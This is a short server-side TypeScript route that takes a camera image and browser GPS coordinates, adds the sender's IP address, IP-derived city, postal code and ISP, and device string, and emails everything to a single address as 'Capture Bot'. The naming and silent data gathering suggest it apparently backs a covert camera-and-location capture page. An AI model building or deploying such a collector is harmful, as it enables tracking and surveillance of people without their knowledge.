import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const { image, lat, lon } = await req.json();

    if (!image || !lat || !lon) {
      return new Response(
        JSON.stringify({ error: "Missing data" }),
        { status: 400 }
      );
    }

    // ── Device info
    const userAgent =
      req.headers.get("user-agent") || "Unknown device";

    // ── Client IP (Vercel-safe)
    const forwardedFor =
      req.headers.get("x-forwarded-for") || "";
    const ip =
      forwardedFor.split(",")[0].trim() || "Unknown IP";

    // ── IPLocate lookup (IP-based location)
    let ipLocationText = "IP location not available";

    if (ip !== "Unknown IP") {
      try {
        const ipRes = await fetch(
          `https://www.iplocate.io/api/lookup/${ip}?apikey=${process.env.IPLOCATE_API_KEY}`
        );

        const ipData = await ipRes.json();

        ipLocationText = `
Country: ${ipData.country || "N/A"}
Region: ${ipData.subdivision || "N/A"}
City: ${ipData.city || "N/A"}
Postal Code: ${ipData.postal_code || "N/A"}
ISP: ${ipData.org || "N/A"}
        `.trim();
      } catch (e) {
        ipLocationText = "IPLocate lookup failed";
      }
    }

    // ── Image (base64 → attachment)
    const base64Data = image.replace(
      /^data:image\/jpeg;base64,/,
      ""
    );

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS
      }
    });

    await transporter.sendMail({
      from: `"Capture Bot" <${process.env.MAIL_USER}>`,
      to: [
        process.env.MAIL_TO_1!
      ],
      subject: "New Capture Received",
      text: `
New capture received

GPS Location (Browser):
Latitude: ${lat}
Longitude: ${lon}

IP Address:
${ip}

IP-Based Location (IPLocate):
${ipLocationText}

Device Info:
${userAgent}
      `.trim(),
      attachments: [
        {
          filename: "capture.jpg",
          content: base64Data,
          encoding: "base64"
        }
      ]
    });

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200 }
    );

  } catch (err) {
    console.error("Send error:", err);

    return new Response(
      JSON.stringify({ error: "Server error" }),
      { status: 500 }
    );
  }
}
